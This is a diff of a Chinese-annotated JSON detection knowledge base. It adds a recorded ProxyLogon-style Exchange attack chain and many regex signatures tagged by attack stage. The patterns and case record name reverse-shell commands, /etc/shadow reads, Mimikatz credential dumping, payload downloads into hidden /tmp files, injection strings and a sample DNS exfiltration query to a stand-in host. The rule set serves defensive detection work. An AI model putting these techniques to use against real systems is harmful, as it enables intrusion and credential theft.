+          "c2VjcmV0LWRhdGEtMDE.exfil-cdn.com TXT 203.0.113.66（长 base64 标签 DNS TXT 外传）"
+        ],
+        "entry_path": "/ecp/7b37f0/ecp.aspx",
+        "webshell_path": "/aspnet_client/system_web/upd_shell.aspx",
+        "c2_channel": "DNS TXT（长 base64 标签）；解析应答 203.0.113.66",
+        "detection_layers": "waf+web（入口请求）→ hids（IIS 进程链/提权/服务注册）→ rasp+web（webshell 调用）→ dns（外传）"
+      },
+      "signature": "Exchange ProxyLogon 风格利用链：`/ecp/` 端点 + `X-BEResource` SSRF 头作入口；`w3wp.exe` 派生子进程 `cmd.exe` 确认执行落地；`/aspnet_client/…aspx` webshell；`PrintSpoofer.exe`(SeImpersonatePrivilege) 提权；`sc.exe create` 注册服务持久化；19 位 base64 标签 DNS TXT 外传。已 1 次观测。",
+      "reasoning": "判定：一条跨 5 源的完整攻击链，与既有案例无实质重合（行级各行弱档或零命中；链级仅命中通用探针 whoami 的弱档 → 按噪声处理，不作匹配依据）→ 按【新案例】新建。链序证据：① 08:12 waf/web 同请求携带 `X-BEResource` SSRF 头（ProxyLogon 特征，T1190）；② 28 秒后 hids 见 IIS 工作进程 `w3wp.exe` 派生 `cmd.exe /c whoami & ipconfig`（T1059.003，执行落地）；③ 40 秒后 rasp/web 见 `/aspnet_client/system_web/upd_shell.aspx` 调用（T1505.003，webshell）；④ 7 分钟后 hids 见 `PrintSpoofer.exe` + SeImpersonatePrivilege（T1068，提权）；⑤ 2 分钟后 `sc.exe create UpdaterSvc`（T1543.003，服务持久化）；⑥ 9 分钟后 dns 见长 base64 标签 TXT 查询（T1048.003，DNS 外传）。证据从严：未见横向移动/凭据窃取直接证据，暂不标注。",
+      "retrieval_keys": [
+        "x-beresource",
+        "proxylogon",
+        "ecp.aspx",
+        "aspnet_client",
+        "aspx",
+        "webshell",
+        "printspoofer",
+        "seimpersonate",
+        "sc create",
+        "UpdaterSvc",
+        "exfil-cdn",
+        "dns txt",
+        "外传"
+      ],
+      "pattern_probes": [
+        "x-beresource=",
+        "/ecp/[a-z0-9]+/ecp\\.aspx",
+        "w3wp\\.exe.{0,120}?cmd\\.exe",
+        "/aspnet_client/[A-Za-z0-9_/]+\\.aspx",
+        "printspoofer(?:\\.exe)?",
+        "sc(?:\\.exe)?\\s+create\\s+\\w+\\s+binpath=",
+        "\\b[A-Za-z0-9+/=]{18,}\\.[a-z0-9-]+\\.[a-z]{2,}\\b"
+      ],
+      "action_sequence": [
+        "exch_proxylogon_ssrf",
+        "w3wp_spawn_cmd",
+        "aspx_shell_path",
+        "printspoofer_priv",
+        "sc_create_service",
+        "dns_b64_label_beacon"
+      ],
+      "action_sources": [
+        [
+          "waf",
+          "web"
+        ],
+        "hids",
+        [
+          "web",
+          "rasp"
+        ],
+        "hids",
+        "hids",
+        "dns"
       ]
     }
   ],
@@ -1066,332 +1674,500 @@
     "whoami_probe": {
       "label": "whoami 侦察探针",
       "regex": "\\bwhoami\\b",
-      "generic": true
+      "generic": true,
+      "stage": "recon"
     },
     "cmd_id_probe": {
       "label": "cmd=id 命令探针",
       "regex": "cmd=id\\b",
-      "generic": true
+      "generic": true,
+      "stage": "execution"
     },
     "cmd_loopback_probe": {
       "label": "cmd=127.0.0.1;id 命令探针",
       "regex": "cmd=127\\.0\\.0\\.1;",
-      "generic": true
+      "generic": true,
+      "stage": "execution"
     },
     "echo_id_probe": {
       "label": "echo;id 命令探针",
       "regex": "echo;id",
-      "generic": true
+      "generic": true,
+      "stage": "execution"
     },
     "id_hostname_probe": {
       "label": "id;hostname 侦察",
       "regex": "id;\\s*hostname",
-      "generic": true
+      "generic": true,
+      "stage": "recon"
     },
     "smuggle_marker": {
       "label": "HTTP 走私形态标记 smuggle",
       "regex": "smuggle",
-      "generic": true
+      "generic": true,
+      "stage": "initial_access"
     },
     "sqli_tautology": {
       "label": "SQLi 恒真绕过 ' OR '1'='1",
       "regex": "'\\s*or\\s+'?1'?(?:\\s*=|$)",
-      "generic": false
+      "generic": false,
+      "stage": "initial_access"
     },
     "java_ser_magic": {
       "label": "Java 序列化流魔数 rO0AB",
       "regex": "rO0AB",
-      "generic": false
+      "generic": false,
+      "stage": "execution"
     },
     "wmic_remote_exec": {
       "label": "WMIC 远程进程创建 (wmic /node:<ip>)",
       "regex": "wmic\\s+/node:[\\d.]+",
-      "generic": false
+      "generic": false,
+      "stage": "lateral"
     },
     "net_user_add": {
       "label": "创建后门账户 (net user /add)",
       "regex": "net\\s+user\\s+/add",
-      "generic": false
+      "generic": false,
+      "stage": "persistence"
     },
     "net_localgroup_add": {
       "label": "账户加入本地组 (net localgroup)",
       "regex": "net\\s+localgroup\\s+ad",
-      "generic": false
+      "generic": false,
+      "stage": "persistence"
     },
     "dga_hex_subdomain": {
       "label": "DGA 随机子域查询 (8位hex.<域>)",
       "regex": "\\b[0-9a-f]{8}\\.[a-z0-9-]+\\.(net|com|org)\\b",
-      "generic": false
+      "generic": false,
+      "stage": "c2"
     },
     "lfi_traversal": {
       "label": "路径穿越 (../ 连写)",
       "regex": "(?:\\.\\./){2,}",
-      "generic": false
+      "generic": false,
+      "stage": "initial_access"
     },
     "node_sandbox_escape": {
       "label": "Node.js 沙箱逃逸链 (constructor/mainModule)",
       "regex": "this\\.constructor\\.constructor|mainModule\\.require",
-      "generic": false
+      "generic": false,
+      "stage": "execution"
     },
     "imds_target": {
       "label": "SSRF 云元数据 (169.254.169.254)",
       "regex": "169\\.254\\.169\\.254",
-      "generic": false
+      "generic": false,
+      "stage": "execution"
     },
     "mount_overlay_priv": {
       "label": "overlay 挂载提权尝试",
       "regex": "mount\\s+-t\\s+overlay",
-      "generic": false
+      "generic": false,
+      "stage": "privilege"
     },
     "ssh_landed_key": {
       "label": "落地密钥 SSH 登录 (ssh -i <key>)",
       "regex": "ssh\\s+-i\\s+\\S+",
-      "generic": false
+      "generic": false,
+      "stage": "lateral"
     },
     "ssh_no_hostcheck": {
       "label": "SSH 免主机校验 (StrictHostKeyChecking=no)",
       "regex": "stricthostkeychecking=no",
-      "generic": false
+      "generic": false,
+      "stage": "lateral"
     },
     "double_encoded_dot": {
       "label": "双编码路径穿越 (%%32%65 / .%2e)",
       "regex": "%%32%65|%252e|\\.%2e",
-      "generic": false
+      "generic": false,
+      "stage": "initial_access"
     },
     "cgi_sh_path": {
       "label": "CGI 穿越至 /bin/sh",
       "regex": "cgi-bin/.*bin/sh",
-      "generic": false
+      "generic": false,
+      "stage": "initial_access"
     },
     "xp_cmdshell_probe": {
       "label": "MSSQL xp_cmdshell 探针",
       "regex": "xp_cmdshell\\(",
-      "generic": false
+      "generic": false,
+      "stage": "execution"
     },
     "com_sun_gadget": {
       "label": "com.sun JNDI gadget 类名",
-      "regex": "com\\.sun\\.",
-      "generic": false
+      "regex": "com\\.sun",
+      "generic": false,
+      "stage": "execution"
     },
     "gcp_metadata_ssrf": {
       "label": "GCP 元数据 SSRF (metadata.google.internal)",
       "regex": "metadata\\.google\\.internal",
-      "generic": false
+      "generic": false,
+      "stage": "execution"
     },
     "net_view_domain": {
       "label": "域枚举 (net view /domain)",
       "regex": "net\\s+view\\s+/domain",
-      "generic": false
+      "generic": false,
+      "stage": "recon"
     },
     "smb_admin_share": {
       "label": "SMB 管理共享挂载 (net use \\\\<ip>\\C$)",
       "regex": "net\\s+use\\s+\\\\\\\\[\\d.]+\\s*\\\\C\\$",
-      "generic": false
+      "generic": false,
+      "stage": "lateral"
     },
     "ssti_object_chain": {
       "label": "SSTI 对象链逃逸 (__class__/__globals__)",
       "regex": "\\{\\{.*__(?:class|globals|init)__",
-      "generic": false
+      "generic": false,
+      "stage": "execution"
     },
     "popen_exec": {
       "label": "popen 命令执行",
       "regex": "popen\\(",
-      "generic": false
+      "generic": false,
+      "stage": "execution"
     },
     "mass_assignment_admin": {
       "label": "批量赋值 admin=true",
       "regex": "\\{\\s*\\\\?\\\"?admin\\\\?\\\"?\\s*:\\s*true",
-      "generic": false
+      "generic": false,
+      "stage": "privilege"
     },
     "mysql_load_file": {
       "label": "MySQL LOAD_FILE 外读",
       "regex": "LOAD_FILE\\(",
-      "generic": false
+      "generic": false,
+      "stage": "exfil"
     },
     "weblogic_shellsession": {
       "label": "WebLogic MVEL ShellSession 句柄",
       "regex": "com\\.tangosol\\.coherence.{0,60}ShellSession",
-      "generic": false
+      "generic": false,
+      "stage": "execution"
     },
     "tmui_semicolon_bypass": {
       "label": "F5 分号路径穿越 (..;/tmui)",
       "regex": "\\.\\.;/tmui",
-      "generic": false
+      "generic": false,
+      "stage": "initial_access"
     },
     "tmshcmd_jsp": {
       "label": "F5 tmshCmd 管理接口",
       "regex": "tmshCmd\\.jsp",
-      "generic": false
+      "generic": false,
+      "stage": "execution"
     },
     "tmsh_list_auth": {
       "label": "tmsh 账户枚举 (command=list+auth)",
       "regex": "command=list\\+auth",
-      "generic": false
+      "generic": false,
+      "stage": "recon"
     },
     "phar_magic": {
       "label": "PHP phar 魔数头 (__HALT_COMPILER)",
       "regex": "__HALT_COMPILER",
-      "generic": false
+      "generic": false,
+      "stage": "execution"
     },
     "phar_filename": {
       "label": "phar 伪装上传 (filename=<n>.phar)",
       "regex": "filename=\\d+\\.phar",
-      "generic": false
+      "generic": false,
+      "stage": "initial_access"
     },
     "php_ser_payload": {
       "label": "PHP 序列化载荷字段 (AAIJABIAAAA)",
       "regex": "AAIJABIAAAA",
-      "generic": false
+      "generic": false,
+      "stage": "execution"
     },
     "spring_routing_expr": {
       "label": "Spring 路由表达式注入 (routing-expression)",
       "regex": "spring\\.cloud\\.function\\.routing-expression",
-      "generic": false
+      "generic": false,
+      "stage": "initial_access"
     },
     "spel_type_ref": {
-      "label": "SpEL 类型引用链 (T(java.lang.Runtime))",
-      "regex": "T\\(java\\.lang\\.Runtime",
-      "generic": false
+      "label": "SpEL 类型引用链 (java.lang.Runtime)",
+      "regex": "java\\.lang\\.Runtime",
+      "generic": false,
+      "stage": "execution"
     },
     "script_javascript": {
       "label": "${script:javascript 脚本变体",
       "regex": "\\$\\{script:javascript",
-      "generic": false
+      "generic": false,
+      "stage": "execution"
     },
     "cron_root_write": {
       "label": "写 root crontab (/var/spool/cron)",
       "regex": "/var/spool/cron",
-      "generic": false
+      "generic": false,
+      "stage": "persistence"
     },
     "bash_reverse_shell": {
       "label": "bash -i 反连",
       "regex": "bash(\\+|\\s)-i",
-      "generic": false
+      "generic": false,
+      "stage": "c2"
     },
     "dev_tcp_redir": {
       "label": "/dev/tcp 反连通道",
       "regex": "dev/tcp/",
-      "generic": false
+      "generic": false,
+      "stage": "c2"
     },
     "shebang_cmd_inject": {
       "label": "cmd_inject=#!//bin/bash 注入标记",
       "regex": "cmd_inject[\\\"']?\\s*[:=]\\s*[\\\"']?#!//bin/bash",
-      "generic": false
+      "generic": false,
+      "stage": "execution"
     },
     "user_register_path": {
       "label": "注册接口 /user/register",
       "regex": "/user/register",
-      "generic": false
+      "generic": false,
+      "stage": "initial_access"
     },
     "union_select_users": {
       "label": "UNION 查询窃取 users 表",
       "regex": "UNION\\s+SELECT.{0,80}FROM\\s+users",
-      "generic": false
+      "generic": false,
+      "stage": "exfil"
     },
     "api_exec_path": {
       "label": "命令执行接口 /api/exec",
       "regex": "/api/exec",
-      "generic": false
+      "generic": false,
+      "stage": "initial_access"
     },
     "cache_key_traversal": {
       "label": "cache_key 路径穿越",
       "regex": "cache_key=\\.\\./",
-      "generic": false
+      "generic": false,
+      "stage": "initial_access"
     },
     "method_construct_override": {
       "label": "框架 _method=__construct 参数覆盖",
       "regex": "_method=__construct",
-      "generic": false
+      "generic": false,
+      "stage": "initial_access"
     },
     "filter_system_override": {
       "label": "filter[]=system 过滤执行",
       "regex": "filter\\[\\]=system",
-      "generic": false
+      "generic": false,
+      "stage": "execution"
     },
     "time_blind_sleep": {
       "label": "时间盲注 SELECT sleep(5)",
       "regex": "SELECT sleep\\(5\\)",
-      "generic": false
+      "generic": false,
+      "stage": "execution"
     },
     "server_req_method_probe": {
       "label": "server[REQUEST_METHOD] 探针",
       "regex": "server\\[REQUEST_METHOD\\]",
-      "generic": false
+      "generic": false,
+      "stage": "recon"
     },
     "xxe_doctype": {
       "label": "XXE DOCTYPE 声明",
       "regex": "<!DOCTYPE",
-      "generic": false
+      "generic": false,
+      "stage": "initial_access"
     },
     "xxe_entity_system": {
       "label": "XXE 外部实体 <!ENTITY ... SYSTEM",
       "regex": "<!ENTITY\\s+\\w+\\s+SYSTEM",
-      "generic": false
+      "generic": false,
+      "stage": "execution"
     },
     "cat_shadow": {
       "label": "读取 /etc/shadow",
       "regex": "cat\\s+/etc/shadow",
-      "generic": false
+      "generic": false,
+      "stage": "exfil"
     },
     "base64_w0": {
       "label": "base64 -w0 编码",
       "regex": "base64\\s+-w0",
-      "generic": false
+      "generic": false,
+      "stage": "exfil"
     },
     "fold_w30": {
       "label": "fold -w 30 分片",
       "regex": "fold\\s+-w\\s+30",
-      "generic": false
+      "generic": false,
+      "stage": "exfil"
     },
     "nslookup_var": {
       "label": "nslookup $<变量域> 外送",
       "regex": "nslookup\\s+\\$",
-      "generic": false
+      "generic": false,
+      "stage": "exfil"
     },
     "dags_run_path": {
       "label": "调度接口 /dags/run",
       "regex": "dags/run",
-      "generic": false
+      "generic": false,
+      "stage": "initial_access"
     },
     "cmd_inject_semi_id": {
       "label": "cmd_inject=;id 命令续接探针",
       "regex": "cmd_inject=;id",
-      "generic": false
+      "generic": false,
+      "stage": "execution"
     },
     "script_exec_text": {
       "label": "脚本内执行并回显 (.execute().text)",
       "regex": "execute\\(\\)\\.text",
-      "generic": false
+      "generic": false,
+      "stage": "execution"
     },
     "rclocal_sed_insert": {
       "label": "sed 植入 rc.local 启动项",
       "regex": "sed\\s+-i.{0,80}rc\\.local",
-      "generic": false
+      "generic": false,
+      "stage": "persistence"
     },
     "tmp_svc_drop": {
       "label": "落地 /tmp/.svc",
-      "regex": "/tmp/\\.svc",
-      "generic": false
+      "regex": "tmp\\\\?/\\.svc",
+      "generic": false,
+      "stage": "persistence"
     },
     "tmp_implant_drop": {
       "label": "落地 /tmp/.implant",
       "regex": "/tmp/\\.implant",
-      "generic": false
+      "generic": false,
+      "stage": "persistence"
     },
     "rclocal_append": {
       "label": "追加写 rc.local",
       "regex": ">>\\s*/etc/rc\\.local",
-      "generic": false
+      "generic": false,
+      "stage": "persistence"
     },
     "fpm_path_param": {
       "label": "PHP fpm_path 路径参数",
       "regex": "fpm_path",
-      "generic": false
+      "generic": false,
+      "stage": "initial_access"
     },
     "xp_dirtree_unc": {
       "label": "MSSQL xp_dirtree UNC 外连",
       "regex": "xp_dirtree",
-      "generic": false
+      "generic": false,
+      "stage": "exfil"
+    },
+    "jndi_lookup": {
+      "label": "JNDI 注入查找 (${jndi:...})",
+      "regex": "\\$\\{jndi:(?:ldap|rmi|dns|iiop)",
+      "generic": false,
+      "stage": "execution"
+    },
+    "uploads_jsp_shell": {
+      "label": "上传目录 JSP webshell (/uploads/*.jsp)",
+      "regex": "/uploads/[a-z0-9_]+\\.jsp",
+      "generic": false,
+      "stage": "initial_access"
+    },
+    "render_api_path": {
+      "label": "反序列化渲染接口 /api/v2/render",
+      "regex": "/api/v2/render",
+      "generic": false,
+      "stage": "initial_access"
+    },
+    "search_api_path": {
+      "label": "搜索接口 /api/v2/search",
+      "regex": "/api/v2/search",
+      "generic": false,
+      "stage": "initial_access"
+    },
+    "sqli_and_sleep": {
+      "label": "盲注 ' AND (SELECT sleep(5))--",
+      "regex": "'\\s*AND\\s*\\(\\s*SELECT\\s+sleep\\(",
+      "generic": false,
+      "stage": "execution"
+    },
+    "mimikatz_exec": {
+      "label": "Mimikatz 工具执行 (mimikatz.exe)",
+      "regex": "\\bmimikatz(?:\\.exe)?\\b",
+      "generic": false,
+      "stage": "execution"
+    },
+    "mimikatz_privilege_debug": {
+      "label": "Mimikatz privilege::debug 调试提权",
+      "regex": "privilege::debug",
+      "generic": false,
+      "stage": "privilege"
+    },
+    "sekurlsa_logonpasswords": {
+      "label": "Mimikatz sekurlsa::logonpasswords 凭据抓取",
+      "regex": "sekurlsa::logonpasswords",
+      "generic": false,
+      "stage": "exfil"
+    },
+    "tmp_dot_download": {
+      "label": "下载载荷落地 /tmp 隐藏文件 (curl/wget -o/-O)",
+      "regex": "(?:curl|wget)\\b[^\\n]{0,80}?-[oO]\\s+/tmp/\\.\\w+",
+      "generic": false,
+      "stage": "execution"
+    },
+    "chmod_x_tmp_dot": {
+      "label": "chmod +x 落地 /tmp 隐藏文件",
+      "regex": "chmod\\s+\\+x\\s+/tmp/\\.\\w+",
+      "generic": false,
+      "stage": "execution"
+    },
+    "exec_tmp_dot": {
+      "label": "执行落地 /tmp 隐藏文件",
+      "regex": "&&\\s*/tmp/\\.\\w+",
+      "generic": false,
+      "stage": "execution"
+    },
+    "exch_proxylogon_ssrf": {
+      "label": "Exchange ProxyLogon SSRF 请求头 (X-BEResource)",
+      "regex": "x-beresource=",
+      "generic": false,
+      "stage": "initial_access"
+    },
+    "w3wp_spawn_cmd": {
+      "label": "IIS 工作进程派生 cmd.exe (w3wp→cmd)",
+      "regex": "w3wp\\.exe.{0,120}?cmd\\.exe",
+      "generic": false,
+      "stage": "execution"
+    },
+    "aspx_shell_path": {
+      "label": "aspnet_client 目录 ASPX webshell",
+      "regex": "/aspnet_client/[A-Za-z0-9_/]+\\.aspx",
+      "generic": false,
+      "stage": "execution"
+    },
+    "printspoofer_priv": {
+      "label": "PrintSpoofer 提权工具 (SeImpersonate)",
+      "regex": "printspoofer(?:\\.exe)?",
+      "generic": false,
+      "stage": "privilege"
+    },
+    "sc_create_service": {
+      "label": "sc create 注册 Windows 服务",
+      "regex": "sc(?:\\.exe)?\\s+create\\s+\\w+\\s+binpath=",
+      "generic": false,
+      "stage": "persistence"
+    },
+    "dns_b64_label_beacon": {
+      "label": "长 base64 标签 DNS TXT 外传",
+      "regex": "\\b[A-Za-z0-9+/=]{18,}\\.[a-z0-9-]+\\.[a-z]{2,}\\b",
+      "generic": false,
+      "stage": "c2"
     }
   }
 }
